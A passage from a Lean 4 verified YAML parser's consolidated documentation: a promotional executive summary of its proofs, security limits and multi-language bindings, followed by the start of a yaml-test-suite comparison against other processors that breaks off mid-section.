# L4YAML Documentation

The consolidated documentation corpus. On 2026-08-01 the eleven
standalone root documents were merged into this single file, organized
by topic, with **[The Plan](#the-plan-open-work)** at the end collecting
every unfinished item. Each section notes the file it came from;
file-level history is in git.

What intentionally lives **elsewhere**:

- [README.md](README.md) — front door: overview, build/test, results,
  the **active next-steps work plan** (its SSOT).
- [C_PYTHON_RUST_APIs.md](C_PYTHON_RUST_APIs.md) — FFI design and
  multi-language API reference.
- [Blueprint/](Blueprint/README.md) — methodology and strategy;
  **Blueprint/04-capstones.md is the proof-status SSOT** (machine-parsed
  by L4YAML.FGM `check-capstones` — do not fold it in here).
- [L4YAML/YAML_PRODUCTIONS.md](L4YAML/YAML_PRODUCTIONS.md) — production
  cross-reference (machine-checked: `Tests/ProductionCoverage.lean`),
  kept next to the code.
- Directory-local `README.md`s under `L4YAML/` and `tools/`.

## Contents

**Overview & results**

- [Executive summary](#executive-summary) — the JPL pitch narrative
- [Test-matrix comparison](#test-matrix-comparison) — 20-processor
  comparison; **score-provenance SSOT** for the README/Executive-summary
  matrix claims

**Design & security reference**

- [Security limits and tag validation](#security-limits-and-tag-validation)
  — DoS threat model, `ParserLimits` presets, tag security
- [Surface syntax formalization](#surface-syntax-formalization) —
  Surface layer / `SurfPos` design; `parse_strict` & `scan_strict` (proven)
- [Anchor and alias pipeline rationale](#anchor-and-alias-pipeline-rationale)
  — why `addAnchor` runs `adaptForFlowContext`; the shape of the
  `WellFormedAnchors` capstone; precise §7.1 scoping

**Methodology**

- [Adversarial instantiation](#adversarial-instantiation) —
  refute-before-prove method (Blueprint Rule 2), plus the
  [historical campaign record](#adversarial-instantiation-campaign-historical)
- [Proof-breaking code patterns](#proof-breaking-code-patterns) — the
  six-pattern catalogue, the proof-breakage predictor, the
  `try`-goal-corruption lesson, refactoring case studies
- [Code-proof architecture mismatch](#code-proof-architecture-mismatch)
  — the design rationale for `StreamAccum.lean`'s lagging-accumulator
  invariant (cited from code)

**[The Plan (open work)](#the-plan-open-work)**

- [The ns-char gap](#the-ns-char-gap) — **fixed 2026-08-01**; closure record
- [Grammar completeness plan](#grammar-completeness-plan) — capstone 7.7,
  the only open proof frontier
- [Merge semantics plan](#merge-semantics-plan) — `DuplicateKeyPolicy.merge`
  design (re-base on `LawfulBEq` first)
- [Security hardening backlog](#security-hardening-backlog) — open
  questions & future work from the security reference
- [Other open items](#other-open-items) — everything else unfinished,
  collected from the sections above

---

## Executive summary

*(was `SUMMARY.md` — "Reinventing Software Engineering at JPL"; consolidated into this file 2026-08-01, file-level history in git)*

**Project**: https://github.jpl.nasa.gov/pass/lean4-yaml-verified
**Author**: N. Rouquette

---

### 1: The Revolution — Markets We Can't Reach Today

**JPL builds the most ambitious robotic systems in human history. But three markets remain out of reach — not because we lack engineering talent, but because our verification practices cannot produce the evidence these markets demand.**

#### DO-178C Level A: Avionics Software for Human-Rated Flight

DO-178C Level A requires the highest assurance for software whose failure is **catastrophic** — loss of aircraft, loss of crew. The standard explicitly allows formal methods as a verification technique (supplement DO-333).

**Why JPL can't compete here today:**
- V&V using tests is inherently incomplete — you can demonstrate the presence of bugs, never their absence
- Level A demands **100% structural coverage** with **independence between verification and development** — testing alone cannot achieve this economically for complex autonomous systems
- For missions at interstellar scale — think *Project Hail Mary*, centuries-long transit times — the software must be **provably error-free**, not "tested well enough." No test suite can cover a century of edge cases. Only mathematical proof can.

#### Medical-Grade Certification: Life-Critical Devices

IEC 62304 Class C (life-critical), FDA 510(k)/PMA for software-intensive medical devices like pacemakers, insulin pumps, surgical robots.

**Why JPL can't compete here today:**
- **Traceability** from requirements to verified implementation — JPL traces requirements to *tests*, not to *proofs*. Regulators increasingly recognize the difference.
- **Evidence that the software cannot enter unsafe states** — testing shows the software *hasn't yet* entered an unsafe state. Formal methods prove it *cannot*.
- Static analysis and testing are necessary but **insufficient** for the highest safety classes — formal methods are necessary, but currently not standard practice at JPL

#### Competitive Bids: Autonomous Systems — Our Biggest Threat

Companies building assurance cases for **autonomous vehicles on Earth** — Waymo, Cruise, Aurora, Mobileye — are developing formal verification toolchains, safety cases, and regulatory relationships at industrial scale. **That same expertise transfers directly to autonomous space vehicles.**

**Why this is JPL's biggest competitiveness threat:**
- These companies prove **safety** (the system never enters a catastrophic state), **progress** (the system always eventually accomplishes its objectives), and **reachability** (the system can reach any required state from any valid initial state) — the exact properties needed for autonomous spacecraft
- They operate in an environment where formal methods are **a competitive differentiator**, not an academic curiosity — and they are hiring the talent, building the tools, and establishing the track record
- When a defense or space prime issues an RFP requiring mathematical safety proofs for autonomous systems, these companies can respond. **JPL currently cannot.**

The state space is vast, the environment is adversarial, and the control logic is increasingly learned or adaptive. Test-based V&V cannot credibly claim safety properties hold for all inputs. The autonomous vehicle industry knows this — and they are already building the alternative.

> **The question is not whether formal verification will become standard practice for safety-critical software. The question is whether JPL will lead or follow — and whether terrestrial autonomy companies will enter our market before we adopt their methods.**

---

### 2: The Paradigm Shift — From Testing to Proof

#### Five years ago, this was science fiction.

Could you build a provably safe, spec-compliant parser for a complex data language — and then make those proofs available to C, Python, and Rust simultaneously?

**How about YAML 1.2.2?** — a widely used data representation language that is deceptively complex: 205 grammar productions, context-sensitive indentation, unicode-aware character classes, and a long history of critical CVEs.

From a cyber-security perspective, YAML parsing is a nightmare:
- **Billion laughs attacks** (CVE-2020-14343): Exponential alias expansion → denial of service
- **Arbitrary Code Execution** (CVE-2022-38749): Malicious tags trigger unsafe deserialization
- **Structural injection**: Crafted scalars misinterpreted as keys, values, or directives

**How about a provably safe, spec-compliant YAML parser with guaranteed resource limits that demonstrably resists DoS, ACE, and structural injection attacks?**

Now raise the stakes:

- **How about doing this for C** — the lingua franca of flight software — where memory safety alone is notoriously hard to prove?
- **How about doing this for Python** — the world's most popular language — whose dynamic typing and optional type annotations make formal proofs even harder than for C?
- **How about doing this for Rust** — a next-generation memory-safe language — where the borrow checker helps but doesn't prove functional correctness?
- **How about doing this for all of the above, simultaneously, from a single verified source?**

#### Today, with GenAI assistance and expert guidance, this is real.

It takes adopting a radically unorthodox software engineering development paradigm — **Lean 4**, a functional programming language that doubles as an interactive theorem prover, unleashing the full power of mathematical rigor for GenAI-assisted mechanized proofs.

**One verified implementation. One proof of correctness. Native bindings to C, Python, and Rust.**

The verified Lean parser compiles to C via Lean's code generator. A thin FFI layer exposes 33 C-callable functions. Python calls them via `ctypes`. Rust calls them via `bindgen`. **Every language gets the same proven guarantees** — termination, soundness, completeness, resource bounds — because they all execute the same verified code.

```
                    Lean 4 (verified source)
                    ├── 6,678 machine-checked theorems
                    ├── 0 axioms, 0 sorry; 0 partial def in the verified core
                    └── Compiles to C via Lean IR
                              │
                    ┌─────────┼─────────┐
                    ▾         ▾         ▾
                C API     Python      Rust
              (33 fns)   (ctypes)   (bindgen)
              libl4yaml.so ← shared verified core
```

**This is not a toy demo.** It is a production YAML 1.2.2 parser (all
metrics below as of 2026-07-31, from `docs/reports/stats.json` — regenerated
by CI's `collect-stats` — and the self-hosted YAML Test Matrix):
- **6,678 theorems** machine-checked by Lean 4's trusted kernel — 0 with a (transitive) `sorry`, 0 depending on a custom axiom
- **3,414 compile-time guards** — continuous verification at build time
- **0 axioms, 0 `sorry`; 0 `partial def` in the verified core** — the only 8 `partial def`s in the library sit outside it, in the post-parse limit validators (`Config/Limits.lean`) and the event/JSON test-matrix emitters (`Output/Events.lean`, `Output/Json.lean`)
- **100% on the YAML Test Matrix** — event 402/402 and JSON 282/282: all 308 valid event streams and all 279 JSON oracles match byte-for-byte, every invalid input is rejected — plus the mathematical proofs that make the test suite redundant
- **Configurable security limits** — billion laughs protection, nesting bounds, scalar size caps, tag policy enforcement
- **128 Python tests, 21 Rust tests** — all passing against the verified shared library

---

### 3: What We Prove — And Why It Matters

#### The Proven Properties

lean4-yaml-verified is not a parser with a few spot-checks. It is a parser where **every behavior** has a mathematical proof. Here are the specific properties proven and why each matters in practice:

| Property | Formal Statement | Why It Matters |
|----------|-----------------|----------------|
| **Termination** | Every function in the verified core is a total `def` — Lean's kernel rejects non-terminating code | The verified parsing pipeline **cannot hang** on any input — a mathematical impossibility, not a test result. (8 `partial def`s exist outside the verified core — the post-parse limit validators in `Config/Limits.lean`, reachable from `parseYamlSafe`, and the event/JSON test-matrix emitters in `Output/` — their termination is not kernel-checked; see §4.) |
| **Soundness** | `parseYaml s = .ok docs → ValidYaml s docs` | If the parser accepts input, the output is a **valid YAML 1.2.2 data structure**. No silent misinterpretation, no corrupted AST, no phantom keys or values. |
| **Completeness** | `ValidYaml s docs → parseYaml s = .ok docs` (via `DecidableEq` + `native_decide`) | The parser **never rejects valid YAML**. If input conforms to the spec, it parses. No false negatives. |
| **Acceptance strictness** | `parseYaml s = .ok docs → InYamlLanguage s` | If the parser accepts input, that input **belongs to the formal YAML 1.2.2 grammar** — all 205 productions. The parser doesn't silently accept malformed input. |
| **Round-trip correctness** | `parse(emit(data)) = data` (58 theorems + 63 guards) | **No data corruption** through serialization cycles. What you write is what you read back. |
| **Schema resolution** | 35 theorems proving `resolve` maps tags to canonical types per §10.3 | Tag resolution (e.g., `!!int`, `!!bool`, `!!null`) **matches the spec exactly** — no edge cases where `"true"` becomes a string or `"1.0"` becomes an integer. |
| **Error discriminability** | `scan_error_ne_schema_error`, constructor injectivity | Error types are **provably distinct** — pattern matching on errors is exhaustive and correct. No conflated error categories. |
| **LawfulBEq** | 32 proofs across the entire AST hierarchy | Equality comparison is **reflexive, symmetric, transitive** — `v == v` is always `true`, `v₁ == v₂ → v₁ = v₂`. Required for correct hash maps, deduplication, caching. |
| **Value algebra** | Algebraic properties of `YamlValue` operations | Structural operations (merge, lookup, update) **preserve invariants** — no silent corruption of nested structures. |
| **Valid token streams** | `scan ok → ValidTokenStreamProp` (size ≥ 2, ordered positions, stream start/end markers) | The scanner **always produces well-formed token streams** — no missing delimiters, no out-of-order positions, no truncated output. |
| **Valid documents** | `parseYaml ok → ValidDocumentProp ∧ ValidStreamProp` | Every parsed document has a **valid node tree** and the document array forms a **valid multi-document stream** per §9. |
| **Resource limits** | `ParserLimits` enforcement (configurable bounds) | Alias expansion, nesting depth, scalar size, collection size, and input size are **bounded** — billion laughs attacks hit a configurable wall. |

#### Why These Properties Matter — The Practical Impact

**Termination + Resource Limits = DoS Immunity.** A crafted YAML file cannot hang your parser or exhaust your memory. For a service that accepts YAML from untrusted sources (Kubernetes admission controllers, CI/CD pipelines, web APIs), this is the difference between "we fuzz-tested and hope it's safe" and "it is mathematically impossible to DoS through the parser."

**Soundness + Acceptance Strictness = No Silent Corruption.** The parser never produces an invalid AST (soundness), and it never accepts input that doesn't belong to the YAML grammar (strictness). Together, these mean: if your config file parses, it's valid YAML, and the resulting data structure faithfully represents its content. For a pacemaker's configuration or a spacecraft's parameter file, "silently misinterpreted" is unacceptable.

**Round-Trip Correctness = Data Integrity.** When your deployment pipeline reads a YAML config, modifies a parameter, and writes it back, the unmodified fields are **provably unchanged**. No whitespace-induced data loss, no scalar style corruption, no anchor/alias resolution artifacts.

**Completeness = No False Rejections.** Valid YAML always parses. Your users never hit "parse error" on a file that conforms to the spec. For a configuration management system, false rejections are operationally indistinguishable from bugs.

#### The Fundamental Asymmetry

| What Testing Shows | What Testing **Cannot** Show |
|-------------------|------------------------|
| "Works on 1,000 examples" | "Works on **all** inputs" |
| "Found 50 bugs" | "**No more** bugs exist" |
| "Fast on these files" | "**Never** crashes or hangs" |
| "Handles known attack vectors" | "**No unknown** attack vectors remain" |
| "Survived 10 years in production" | "Will survive 100,000 years" |

#### Comparison: Verified vs. Compact Unverified Parsers

Small, well-written YAML parsers exist. [yaml-rust2](https://github.com/ethiraric/yaml-rust2) (~5K LOC Rust) and [libfyaml](https://github.com/pantoniou/libfyaml) (~30K LOC C) are actively maintained, performant, and widely used. Why isn't "small and well-tested" enough?

| Dimension | [yaml-rust2](https://github.com/ethiraric/yaml-rust2) (Rust) | [libfyaml](https://github.com/pantoniou/libfyaml) (C) | **lean4-yaml-verified** (Lean 4) |
|-----------|------|--------|------|
| **LOC** | ~5K | ~30K | ~5K scanner+parser + ~152K proofs |
| **Language safety** | Memory-safe (borrow checker) | Manual memory mgmt (C) | Memory-safe + functionally verified |
| **Termination** | Not proven — `loop`/`while` could hang on crafted input | Not proven — `while` loops, recursion | **Proven** — zero `partial def`, Lean kernel rejects non-terminating code |
| **Soundness** | Tested on yaml-test-suite | Tested on yaml-test-suite | **Proven** — `parseYaml ok → ValidYaml` theorem |
| **Completeness** | Unknown — may reject valid YAML | Unknown — may reject valid YAML | **Proven** — `ValidYaml → parseYaml ok` |
| **Acceptance strictness** | Unknown — may accept invalid YAML | Unknown — may accept invalid YAML | **Proven** — `parseYaml ok → InYamlLanguage` |
| **Round-trip** | Tested on examples | Tested on examples | **Proven** — `parse(emit(data)) = data` (58 theorems) |
| **DoS protection** | Partial (some limits) | Partial (some limits) | **Proven** — configurable `ParserLimits` with enforcement proofs |
| **Spec conformance** | yaml-test-suite (empirical) | yaml-test-suite (empirical) | yaml-test-suite (empirical) **+ 6,678 machine-checked theorems** |
| **Latent CVE risk** | Unknown — Rust prevents memory bugs but not logic bugs | Unknown — C has both memory and logic bug risk | **Zero parser logic CVEs possible** — all behaviors proven |
| **Formal grammar coupling** | None — code is the spec | None — code is the spec | **205 YAML productions formalized** as Lean Props; scanner coupled to formal grammar |

**The key insight**: yaml-rust2 and libfyaml are excellent engineering. Their test suites are thorough. But tests are **finite samples from an infinite input space**. Between any two tested inputs lies an untested region where bugs can hide — and have hidden, for years, in every YAML parser ever written (PyYAML: 8 years to CVE-2020-14343; snakeyaml: production deployment to CVE-2022-38749).

lean4-yaml-verified's 6,678 theorems don't sample the input space — they **cover it entirely**. The termination proof doesn't check a billion inputs for hangs; it proves hanging is structurally impossible. The soundness theorem doesn't validate a thousand parse trees; it proves every parse tree is valid. This is the difference between "we looked hard and found nothing" and "there is nothing to find."

**Compact code is not verified code.** yaml-rust2's 5K LOC is admirably small, but every line is an unverified claim about YAML semantics. lean4-yaml-verified's ~5K LOC of scanner+parser code makes the same claims — and then proves each one with ~152K LOC of machine-checked mathematical proof. That roughly 30:1 proof-to-parser ratio (about 7:1 against the full ~22K-line executable library) is the cost of certainty. For most applications, yaml-rust2's engineering quality is sufficient. For applications where "sufficient" means "provably correct" — avionics, medical devices, interstellar missions — it is not.

#### Three Proof Layers — Each Eliminates a Vulnerability Class

```
Layer 1: Character-Level (Eliminates: Unicode edge cases, encoding bugs)
├─ Specification: isWhiteSpaceProp (mathematical definition from YAML spec)
├─ Implementation: isWhiteSpaceBool (executable code in parser)
└─ Bridging Theorem: ∀ c, isWhiteSpaceBool c ↔ isWhiteSpaceProp c
   → Guarantees: No unicode character can be misclassified
   → Security: Prevents whitespace-based structural attacks
   → Build-time check: If either changes without the other, compilation fails

Layer 2: Token-Level (Eliminates: Structural injection, malformed tokens)
├─ Proves scanner output satisfies YAML grammar rules
├─ Example: scan_plain_scalar_valid theorem
│   "If scanner produces plain scalar token,
│    then content satisfies validPlainFirst ∧ noColonSpace"
│   → Prevents: Missing key names parsing as null keys (`: value`)
│   → Prevents: Structural injection via colons in scalar content
└─ Catches: Any token violating YAML 1.2.2 productions [126]–[134]

Layer 3: Grammar-Level (Eliminates: Misinterpretation, silent corruption)
├─ End-to-end: Input string → Parsed value satisfies YAML 1.2.2 spec
├─ Capstone theorem: parseYaml s = .ok v → ValidYaml s v
│   → Guarantees: Every accepted input produces a valid YAML data structure
│   → Guarantees: Every rejected input violates the spec (no false negatives)
└─ Connects all layers: char properties → token properties → grammar correctness
   → Result: No path from input string to output value lacks a proof
```

#### Supply Chain Security: Proven Guarantees

| Threat | Traditional Parsers | Verified Parser (This Work) |
|--------|--------------------|-----------------------------|
| **Infinite loops** | Unknown — hope testing found them | **✅ Proven termination** — mathematically impossible to hang |
| **ACE via edge cases** | Unknown — test coverage incomplete | **✅ Proven soundness** — every input handled correctly or rejected |
| **DoS via resource exhaustion** | Unknown — fuzzing may miss patterns | **✅ Configurable limits** — proven enforcement of bounds |
| **Unknown parsing bugs** | Post-deployment CVEs likely | **✅ Zero latent parsing bugs** — all behaviors proven |
| **Billion laughs** | Patched *after* CVE disclosure | **✅ Alias expansion limits** — max 100K resolved nodes (configurable) |
| **Structural injection** | Found by specific test cases | **✅ Proven impossible** — `validPlainFirst` theorem |

#### Why C, Python, Go, Rust Parsers Can't Do This

- **C** (libyaml, libfyaml): Manual memory management, undefined behavior, no proof language — auditing 30K LOC of pointer arithmetic is intractable. libfyaml is well-engineered but every `while` loop is an unverified termination claim.
- **Python** (PyYAML, ruamel.yaml): Dynamic typing, mutable state, runtime errors — `pytest` checks examples, can't express `∀ input`
- **Go** (go-yaml): Garbage-collected but no dependent types — can't express or check invariants at compile time
- **Rust** (yaml-rust2, serde-yaml): Borrow checker proves memory safety, not functional correctness — yaml-rust2 can parse safely but can't prove it parses *correctly* or that it won't hang on crafted input

**Lean 4 is unique**: it is simultaneously a general-purpose programming language (with native code generation to C) and an interactive theorem prover (with dependent types and a trusted kernel). This is not a tradeoff — it is both at once. Crucially, Lean 4 is the **only** language in this class whose kernel has [multiple independent implementations](https://leodemoura.github.io/blog/2026-3-16-who-watches-the-provers/) — written in Rust, C, Lean itself, and others — that are **nightly cross-tested** against each other. No other theorem prover (Coq, Agda, Isabelle, F*) subjects its trusted core to this level of independent V&V.

---

### 4: The Proof of Concept — Quantified Results

#### Parser Verification (Complete)

| Metric | Value (2026-07-31, `docs/reports/stats.json`) |
|--------|-------|
| **Theorems** | 6,678 machine-checked by Lean 4's trusted kernel |
| **Compile-time guards** | 3,414 (including 356 auto-generated from yaml-test-suite) |
| **Custom axioms** | 0 |
| **`sorry` (unproven gaps)** | 0 |
| **`partial def` (non-terminating)** | 0 in the verified core (8 total in the library, all outside it: `Config/Limits.lean` ×4, `Output/Events.lean` ×2, `Output/Json.lean` ×2) |
| **YAML Test Matrix** | event 402/402, JSON 282/282 (100%) |
| **YAML 1.2.2 spec examples** | 132/132 (100%) |
| **Parser LOC** | ~5,000 (scanner + token parser; ~21,900 executable library total) |
| **Proof LOC** | ~151,600 (131 proof files) |
| **Build jobs** | 868/868, 0 errors |

#### Multi-Language FFI (Complete)

| Language | Binding | Tests | Status |
|----------|---------|-------|--------|
| **C** | 33 exported functions, opaque handle ABI, `libl4yaml.so` | Verified via `nm -D` | ✅ Production |
| **Python** | `ctypes` package, 5 modules, full `YamlValue` API | 128 tests | ✅ Production |
| **Rust** | 2-crate workspace (`l4yaml-sys` + `l4yaml`), safe RAII wrapper | 21 tests | ✅ Production |

#### Security Limits (Complete)

| Threat | Limit | Default |
|--------|-------|---------|
| Billion-laugh alias expansion | `maxResolvedNodes` | 100,000 |
| Excessive alias depth/count | `maxAliasDepth` / `maxAliasExpansions` | 50 / 10,000 |
| Deep nesting | `maxDepth` | 100 |
| Oversized scalars | `maxScalarBytes` | 10 MB |
| Large collections | `maxSequenceLength` / `maxMappingSize` | 100,000 |
| Input size | `maxInputBytes` | 100 MB |
| Language-specific tags (`!!python/*`) | `rejectLanguageTags` | true |

#### Comparison to Industry Verified Systems

| System | Domain | Code | Proofs | Team | Timeline | Deployed |
|--------|--------|------|--------|------|----------|----------|
| **seL4** | Verified OS kernel | ~200K LOC | ~480K LOC | 12–15 researchers (NICTA/Data61), ~20 person-years | 2004–2009 (5 yrs to first proof) | Defense systems |
| **CompCert** | Verified C compiler | ~60K LOC | ~100K LOC | 7 core (INRIA, led by Leroy), ~6–8 person-years | 2005–2008 (3 yrs to first release) | Airbus avionics |
| **AWS Cedar** | Verified authorization | ~20K LOC | ~40K LOC | 63 contributors, est. 5–15 core (AWS) | 2021–2023 (2+ yrs to announcement) | Cloud security |
| **lean4-yaml-verified** | **Verified YAML parser** | **~5K LOC** | **~152K LOC** | **1 engineer + GenAI** | **2024–2026** | **Aerospace configs (C, Python, Rust)** |

Same class of rigor. Same trusted-kernel verification. **Only verified YAML parser in any language.**

The comparison is stark: seL4 required 12–15 researchers and 20 person-years. CompCert required 7 core researchers and 6–8 person-years. **lean4-yaml-verified was built by one engineer with GenAI assistance (2024–2026).** The parser is smaller than a kernel or compiler, but the methodology — GenAI-accelerated proof engineering in Lean 4 — represents a step change in what is achievable by a small team.

---

### 5: The Vision — Reinventing Software Engineering at JPL

#### Three Markets, One Capability

**1. DO-178C Level A Avionics**

| Requirement | Current JPL Practice | With Verified Software |
|-------------|---------------------|----------------------|
| Structural coverage | MC/DC via testing (expensive, incomplete) | **Proven by construction** — every code path has a theorem |
| Independence of V&V | Separate test team | **Independent proof checker** — Lean 4's trusted kernel (~5K LOC) has [multiple independent implementations](https://leodemoura.github.io/blog/2026-3-16-who-watches-the-provers/) nightly-tested against each other |
| Absence of errors | "No known bugs" | **"No bugs possible"** — mathematical impossibility |
| Change impact | Re-test everything | **Proof breaks pinpoint exactly what changed** |
| DO-333 formal methods credit | Not used | **Full credit** — theorem artifacts are formal method evidence |

For a 100,000-year interstellar mission, the software must outlive every human who wrote it, tested it, or reviewed it. The only V&V that survives that timescale is mathematical proof.

---

**2. Medical-Grade Certification (IEC 62304 Class C)**

| Requirement | Current Industry Practice | With Verified Software |
|-------------|--------------------------|----------------------|
| Risk control for life-critical | Testing + static analysis | **Proven safety properties** — provably no unsafe states |
| Traceability | Req → test → result | **Req → theorem → proof** (machine-checkable) |
| Regression assurance | Re-run test suite | **If it compiles, it's correct** — proofs are checked at build time |
| Anomaly analysis | Post-hoc incident review | **Pre-hoc impossibility proof** — certain anomalies can't occur |

Pacemakers, insulin pumps, surgical robots — the FDA increasingly recognizes formal methods. JPL could license verified software components (parsers, config validators, state machines) to medical device manufacturers. **A new revenue stream from proven correctness.**

---

**3. Highest-Assurance Competitive Bids**

For defense, intelligence, and critical infrastructure proposals, the winning bid is the one that can **prove** — not just claim — safety properties:

| Property | Can You Prove It With Tests? | With Formal Verification |
|----------|------------------------------|--------------------------|
| **Safety**: System never enters catastrophic state | ✗ — can only show it didn't in tested scenarios | **✅ Proven for all reachable states** |
| **Progress**: System always eventually achieves objective | ✗ — liveness is undecidable from finite traces | **✅ Proven by well-founded induction** |
| **Reachability**: System can reach any required operational mode | ✗ — combinatorial explosion of state transitions | **✅ Proven by constructive witness** |

These properties become **exponentially harder** for autonomous systems — learned controllers, adaptive planning, multi-agent coordination. Testing-based V&V hits a wall. Mathematical proof scales where testing cannot.

---

#### The Development Paradigm

**How is this possible — and why now?**

Four converging forces:

1. **Lean 4**: A functional programming language with dependent types, native C code generation, and an interactive theorem prover with a trusted kernel of only ~5K LOC. It is both the implementation language and the proof language — no gap between what you run and what you verify. Uniquely, Lean 4's kernel has [multiple independent implementations](https://leodemoura.github.io/blog/2026-3-16-who-watches-the-provers/) nightly cross-tested against each other — the only theorem prover with this level of independent kernel V&V.

2. **GenAI-Assisted Proof Engineering**: Large language models can draft proof sketches, suggest tactic sequences, and accelerate the exploration of proof strategies. Expert guidance steers the AI past dead ends. The result: proof development that would have taken months now takes days.

3. **Formalized Domain Libraries — Mathematics Made Executable**: A growing ecosystem of machine-checked mathematical knowledge changes what is practically provable. [Mathlib](https://leanprover-community.github.io/mathlib4_docs/) (1M+ lines of formalized mathematics), [PhysLib](https://github.com/HEPLean/PhysLean) (formalized physics), and others represent international collaborations among the world's foremost domain experts — formalizing theorems that took centuries to develop.

   **Why this matters for software engineering**: It is a well-established principle in formal methods (cf. [de Roever & Engelhardt, *Data Refinement*](https://www.cambridge.org/us/universitypress/subjects/computer-science/programming-languages-and-applied-logic/data-refinement-model-oriented-proof-methods-and-their-comparison); [Abrial, *Modeling in Event-B*](https://doi.org/10.1017/CBO9781139195881)) that proving properties of software becomes dramatically simpler when data structures and functions are designed to preserve the mathematical properties of their corresponding abstract models. This **refinement-based design** — where an abstract mathematical specification is systematically refined into a concrete implementation while preserving proven invariants — allows us to leverage the rich body of theorems in Mathlib and apply them, via refinement, directly to production code.

   Five years ago, refinement-based formalized software engineering was the stuff of academic papers and PhD theses. With GenAI to accelerate proof construction and formalized libraries like Mathlib providing thousands of ready-to-use theorems, **this is now a practical engineering methodology.** The mathematical infrastructure exists. The proof automation exists. It is up to organizations like JPL to embrace it.

4. **FFI as a Force Multiplier**: Lean compiles to C via its IR. One verified implementation produces a shared library callable from C, Python, Rust, or any language with a C FFI. **Prove once, deploy everywhere.** The proofs don't need to be redone for each target language.

**The paradigm**:
```
1. Specify — Write the mathematical specification in Lean (Prop-level definitions)
2. Implement — Write the executable code in Lean (def-level functions)
3. Prove — Bridge spec ↔ impl with machine-checked theorems (6,678 of them)
4. Compile — Lean IR → C → shared library (libl4yaml.so)
5. Bind — C header + shim → Python ctypes / Rust bindgen
6. Ship — Every consumer gets proven guarantees. Every build re-checks every proof.
```

If the spec changes, the proofs break → you know exactly what to fix.
If the implementation changes, the proofs break → you know exactly what drifted.
If neither changes, the proofs still pass → guaranteed correctness, indefinitely.

---

#### The Roadmap: From YAML to Safety-Critical Systems

YAML parsing is the **proof of concept** — a complex, security-sensitive problem solved with full mathematical rigor. The paradigm generalizes:

```
Phase 1 (Complete): Verified YAML 1.2.2 Parser
├── 6,678 theorems, 0 sorry, 0 axioms
├── C / Python / Rust bindings
├── Configurable security limits
└── 100% spec conformance + mathematical proofs

Phase 2 (Next): Verified Configuration Validators
├── Project-specific schema proofs (e.g., "all robot_speed params are positive floats")
├── End-to-end: YAML file → valid typed config → running system
└── Round-trip proven: parse(emit(data)) = data

Phase 3 (Future): Verified State Machines & Control Logic
├── Proven safety: system never enters catastrophic state
├── Proven progress: system always achieves objectives
├── Proven reachability: all operational modes accessible
└── Applied to autonomous navigation, planning, multi-agent coordination

Phase 4 (Vision): Verified Software Supply Chain
├── Every library with mathematical proof of its contract
├── Composition theorems: if A is safe and B is safe, A∘B is safe
├── DO-178C Level A / IEC 62304 Class C evidence generated from proofs
└── JPL as the gold standard for provably correct aerospace software
```

---

### Summary: The Case for Action

**The problem**: JPL's current test-based V&V practices, while excellent for robotic exploration, cannot produce the evidence required for DO-178C Level A avionics, medical-grade certification, or the highest-assurance competitive bids. These markets demand mathematical proof of correctness — proof that testing fundamentally cannot provide.

**The proof of concept**: A fully verified YAML 1.2.2 parser — 6,678 machine-checked theorems, zero axioms, zero unproven gaps — with production bindings to C, Python, and Rust. Built with Lean 4 and GenAI-assisted proof engineering. A complex, security-critical problem solved with the same mathematical rigor as seL4 and CompCert.

**The opportunity**: Adopt this paradigm — specify, implement, prove, compile, bind, ship — and JPL gains access to:
- **DO-178C Level A**: Formal methods evidence for human-rated avionics software
- **Medical certification**: Proven safety properties for life-critical devices
- **Competitive advantage**: Mathematical proof of safety, progress, and reachability for autonomous systems — properties that no amount of testing can establish

**The bottom line**: This isn't "better testing." It is a **fundamental shift** from "we hope we found all the bugs" to "certain classes of bugs are mathematically impossible."

Five years ago, this was science fiction. Today, it is a working system with 6,678 theorems, production multi-language bindings, and a clear path from YAML parsing to safety-critical autonomous systems.

**The revolution is here. The question is whether JPL will lead it.**

---

## Test-matrix comparison

*(was `YAML_MATRIX_COMPARISON.md` — "L4YAML vs. the YAML processor matrix"; consolidated into this file 2026-08-01, file-level history in git)*

*Structural comparison of L4YAML against 20 other YAML processors on the
[yaml-test-suite](https://github.com/yaml/yaml-test-suite), scored the way
[matrix.yaml.info](https://matrix.yaml.info) scores every processor.*

Generated 2026-07-03 (first measured 2026-07-01) · suite: `yaml/yaml-test-suite`
`data` branch (402 tests) · other processors: `yamlio/alpine-runtime-all` docker
image (built 2021-11-19, the latest published aggregate; per-processor versions
in the Results table, provenance in §Processor versions) · L4YAML v0.5.0 (`main`).

---

### TL;DR

L4YAML is the only processor that is **perfect on all three axes**:

* **Accept/reject — 402/402.** It accepts all 308 valid documents and rejects
  all 94 invalid ones. Every mainstream parser (PyYAML, libyaml, SnakeYAML, …)
  wrongly rejects dozens of valid documents and/or accepts invalid ones.
* **Event axis (full structural output) — 402/402 (100%).** Every valid test's
  event stream matches `test.event` byte-for-byte; every error test is rejected.
  The next-best processors *in this run* are the generated reference parser
  (385, RefParser 0.0.3) and libfyaml (382, v0.7.2). Note that the
  [matrix.yaml.info](https://matrix.yaml.info) snapshot of 2022-01-17 records
  *different builds* of both at 402/402 on the same tests — event-axis scores
  are per-build, not per-library; see §Processor versions below.
* **JSON axis — 282/282 (100%).** Every valid test with a JSON oracle matches
  `in.json` structurally; the 3 error tests that carry a (stale) `in.json` are
  correctly rejected. Next best: YAML::PP and HsYAML (272).

The all-three-axes claim also holds against the published matrix's own
(January 2022) numbers: no processor there is perfect on all three axes either —
c-libfyaml came closest (clean event and accept/reject views, one `diff` on
its JSON view).

When first measured (2026-07-01) L4YAML scored 362/402 event and 240/282 JSON —
the two output axes had never been exercised before (the in-repo suite runner
only checked accept/reject, never L4YAML's *output*). Two new emitters
(`l4yaml-event`, `l4yaml-json`) closed that observation gap, and ten targeted
fixes (trailing newline of folded/clipped block scalars, tab handling in
scalars, empty-node-with-properties sequence entries, bare `...` document
suffixes, explicit-key splitting, tag percent-escapes, escaped trailing tabs,
position-relative alias rebinding, …) closed every remaining difference —
each with the parser's correctness proofs re-established.

---

### What was measured

The [yaml-test-suite](https://github.com/yaml/yaml-test-suite) encodes three
independent oracles per test:

| oracle       | question                                        | axis          |
| ------------ | ----------------------------------------------- | ------------- |
| `error` file | should the parser **reject** this input?        | accept/reject |
| `test.event` | does the emitted **event stream** match?        | event         |
| `in.json`    | does the emitted **JSON** match (Core Schema)?  | json          |

Two emitters produce the matrix's comparison formats directly from the
`YamlValue` representation graph:

* [`L4YAML/Output/Events.lean`](L4YAML/Output/Events.lean) → `l4yaml-event`
  (test-suite event notation; runs on the *raw* parse so anchors/aliases survive).
